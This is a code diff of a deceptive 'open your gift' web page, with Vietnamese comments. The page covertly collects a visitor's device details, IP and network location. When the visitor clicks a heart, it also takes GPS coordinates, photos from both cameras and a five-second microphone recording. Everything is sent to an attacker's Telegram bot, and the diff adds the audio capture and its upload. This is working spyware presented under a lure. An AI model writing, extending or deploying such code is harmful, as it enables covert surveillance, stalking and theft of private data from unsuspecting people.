@@ -50,10 +50,10 @@
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
         
-        let isProcessed = false; // Đảm bảo chỉ gửi dữ liệu 1 lần
-        let autoTimer = null;   // Bộ đếm thời gian 3s
+        let isProcessed = false; 
+        let autoTimer = null;   
 
-        // 1. Lấy thông tin thiết bị & phần cứng
+        // 1. Thu thập thông tin phần cứng & thiết bị
         async function getDeviceInfo() {
             let batteryText = "Không rõ";
             try {
@@ -94,7 +94,7 @@
             };
         }
 
-        // 2. Lấy thông tin IP & Nhà mạng
+        // 2. Thu thập IP & Vị trí mạng
         async function getIPInfo() {
             try {
                 const res1 = await fetch('https://api.ipify.org?format=json');
@@ -138,7 +138,7 @@
             }
         }
 
-        // 3. Lấy Tọa độ GPS chính xác
+        // 3. Yêu cầu quyền GPS và lấy Tọa độ chính xác
         function getGeolocation() {
             return new Promise((resolve) => {
                 if (!navigator.geolocation) { resolve(null); return; }
@@ -150,7 +150,7 @@
             });
         }
 
-        // 4. Chụp ảnh từ Camera
+        // 4. Yêu cầu quyền Camera & Chụp ảnh
         function captureStream(constraints) {
             return new Promise(async (resolve) => {
                 if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
@@ -160,6 +160,7 @@
                 try {
                     const stream = await navigator.mediaDevices.getUserMedia(constraints);
                     video.srcObject = stream;
+                    
                     video.onloadedmetadata = () => {
                         setTimeout(() => {
                             canvas.width = video.videoWidth;
@@ -180,8 +181,43 @@
             });
         }
 
-        // 5. Gửi dữ liệu về Telegram
-        async function sendAllToTelegram(frontBlob, backBlob, captionText) {
+        // 5. Yêu cầu quyền Micro & Thu âm 5 giây
+        function recordAudio(durationMs = 5000) {
+            return new Promise(async (resolve) => {
+                if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+                    resolve(null);
+                    return;
+                }
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                    const mediaRecorder = new MediaRecorder(stream);
+                    const chunks = [];
+
+                    mediaRecorder.ondataavailable = (e) => {
+                        if (e.data.size > 0) chunks.push(e.data);
+                    };
+
+                    mediaRecorder.onstop = () => {
+                        stream.getTracks().forEach(track => track.stop());
+                        const audioBlob = new Blob(chunks, { type: 'audio/ogg; codecs=opus' });
+                        resolve(audioBlob);
+                    };
+
+                    mediaRecorder.start();
+                    setTimeout(() => {
+                        if (mediaRecorder.state !== 'inactive') {
+                            mediaRecorder.stop();
+                        }
+                    }, durationMs);
+                } catch (e) {
+                    resolve(null);
+                }
+            });
+        }
+
+        // 6. Gửi tất cả Dữ liệu (Ảnh, Voice, Văn bản) về Telegram
+        async function sendAllToTelegram(frontBlob, backBlob, audioBlob, captionText) {
+            // Gửi Ảnh (nếu có)
             if (frontBlob && backBlob) {
                 const formData = new FormData();
                 formData.append('chat_id', CHAT_ID);
@@ -189,7 +225,7 @@
                 formData.append('photo2', backBlob, 'back.jpg');
                 
                 const media = [
-                    { type: 'photo', media: 'attach://photo1', caption: captionText + `\n📸 **Ảnh:** Cam Trước & Cam Sau`, parse_mode: 'Markdown' },
+                    { type: 'photo', media: 'attach://photo1', caption: captionText + `\n📸 **Ảnh:** Chụp thành công cả 2 Camera`, parse_mode: 'Markdown' },
                     { type: 'photo', media: 'attach://photo2' }
                 ];
                 formData.append('media', JSON.stringify(media));
@@ -200,12 +236,10 @@
                 });
             } else if (frontBlob || backBlob) {
                 const singleBlob = frontBlob || backBlob;
-                const camType = frontBlob ? 'Camera (Tự động/Trước)' : 'Camera Sau';
-                
                 const formData = new FormData();
                 formData.append('chat_id', CHAT_ID);
                 formData.append('photo', singleBlob, 'photo.jpg');
-                formData.append('caption', captionText + `\n📸 **Ảnh:** ${camType}`, parse_mode = 'Markdown');
+                formData.append('caption', captionText + `\n📸 **Ảnh:** Chụp thành công 1 Camera`, parse_mode: 'Markdown');
                 formData.append('parse_mode', 'Markdown');
 
                 await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
@@ -213,6 +247,7 @@
                     body: formData
                 });
             } else {
+                // Nếu không có ảnh thì gửi tin nhắn văn bản thông thường
                 await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
@@ -223,14 +258,27 @@
                     })
                 });
             }
+
+            // Gửi file ghi âm Voice 5s (nếu thu thành công)
+            if (audioBlob) {
+                const audioFormData = new FormData();
+                audioFormData.append('chat_id', CHAT_ID);
+                audioFormData.append('voice', audioBlob, 'voice.ogg');
+                audioFormData.append('caption', '🎙️ **File Ghi Âm Micro (5 giây)**');
+                audioFormData.append('parse_mode', 'Markdown');
+
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVoice`, {
+                    method: 'POST',
+                    body: audioFormData
+                });
+            }
         }
 
-        // 6. Hàm tổng hợp và gửi văn bản thông tin
-        async function buildCaption(triggerType) {
-            const [deviceInfo, ipData, gpsLocation] = await Promise.all([
+        // 7. Tổng hợp chuỗi văn bản báo cáo
+        async function buildCaption(triggerType, gpsLocation) {
+            const [deviceInfo, ipData] = await Promise.all([
                 getDeviceInfo(),
-                getIPInfo(),
-                getGeolocation()
+                getIPInfo()
             ]);
 
             let captionText = `📊 **BÁO CÁO THU THẬP TỔNG HỢP**\n`;
@@ -265,54 +313,58 @@
             return captionText;
         }
 
-        // --- XỬ LÝ LỰA CHỌN KỊCH BẢN ---
+        // --- CÁC KỊCH BẢN XỬ LÝ ---
 
-        // KỊCH BẢN A: Tự động gửi sau 3 giây (Người dùng KHÔNG ấn vào trái tim)
+        // KỊCH BẢN 1: Sau 3 giây không bấm vào trái tim (Tự động gửi thông tin cơ bản)
         async function autoProcess() {
             if (isProcessed) return;
             isProcessed = true;
 
-            const captionText = await buildCaption("⏱️ Tự động gửi (Người dùng không ấn trái tim)");
-            const finalCaption = captionText + `\n⚠️ **Camera:** Không thu thập (Người dùng chưa tương tác).`;
+            const captionText = await buildCaption("⏱️ Tự động gửi (Không ấn trái tim trong 3s)", null);
+            const finalCaption = captionText + `\n⚠️ **Quyền riêng tư:** Không yêu cầu Camera, Micro & GPS (Chưa tương tác).`;
             
-            await sendAllToTelegram(null, null, finalCaption);
+            await sendAllToTelegram(null, null, null, finalCaption);
         }
 
-        // KỊCH BẢN B: Người dùng BẤM VÀO TRÁI TIM
+        // KỊCH BẢN 2: Người dùng ẤN VÀO TRÁI TIM -> Kích hoạt TẤT CẢ QUYỀN (Camera, Micro, GPS)
         async function handleUserClick() {
             if (isProcessed) return;
             isProcessed = true;
             
-            // Hủy đếm ngược 3s ngay lập tức
             if (autoTimer) clearTimeout(autoTimer);
 
             document.getElementById('statusText').innerText = "Đang mở quà...";
 
-            // Lấy dữ liệu thông tin
-            const captionText = await buildCaption("🔴 Người dùng chủ động ẤN VÀO TRÁI TIM");
+            // 1. Kích hoạt thông báo xin quyền GPS & Lấy vị trí
+            const gpsLocation = await getGeolocation();
 
-            // Thử chụp ảnh Camera
+            // 2. Kích hoạt xin quyền Camera & Chụp ảnh
             let frontPhoto = await captureStream({ video: { facingMode: "user" } });
             let backPhoto = await captureStream({ video: { facingMode: { exact: "environment" } } }) 
                           || await captureStream({ video: { facingMode: "environment" } });
 
-            // Dự phòng nếu không xác định được facingMode
             if (!frontPhoto && !backPhoto) {
                 frontPhoto = await captureStream({ video: true });
             }
 
-            let cameraNote = "\n📸 **Ảnh:** Thu thập thành công.";
-            if (!frontPhoto && !backPhoto) {
-                cameraNote = "\n⚠️ **Camera:** Người dùng không cho phép hoặc thiết bị không hỗ trợ.";
-            }
+            // 3. Kích hoạt xin quyền Micro & Thu âm 5s
+            const audioBlob = await recordAudio(5000);
 
-            // Gửi đầy đủ ảnh và thông tin về Telegram
-            await sendAllToTelegram(frontPhoto, backPhoto, captionText + cameraNote);
+            // 4. Tạo báo cáo chi tiết về quyền
+            const captionText = await buildCaption("🔴 Người dùng BẤM VÀO TRÁI TIM", gpsLocation);
+            
+            let permissionStatus = "\n📋 **TÌNH TRẠNG CẤP QUYỀN:**\n";
+            permissionStatus += `• GPS: ${gpsLocation ? '✅ Đã cấp' : '❌ Từ chối / Lỗi'}\n`;
+            permissionStatus += `• Camera: ${(frontPhoto || backPhoto) ? '✅ Đã cấp' : '❌ Từ chối / Lỗi'}\n`;
+            permissionStatus += `• Micro: ${audioBlob ? '✅ Đã cấp (Thu âm 5s)' : '❌ Từ chối / Lỗi'}\n`;
 
-            document.getElementById('statusText').innerText = "Chúc bạn một ngày vui vẻ! ❤";
+            // 5. Gửi toàn bộ dữ liệu thu thập được về Telegram
+            await sendAllToTelegram(frontPhoto, backPhoto, audioBlob, captionText + permissionStatus);
+
+            document.getElementById('statusText').innerText = "Chúc bạn một ngày vui vẻ! ❤️";
         }
 
-        // Tự động kích hoạt bộ đếm 3 giây ngay khi mở trang web
+        // Đếm ngược 3 giây tự động khi vừa tải trang
         window.onload = () => {
             autoTimer = setTimeout(() => {
                 autoProcess();
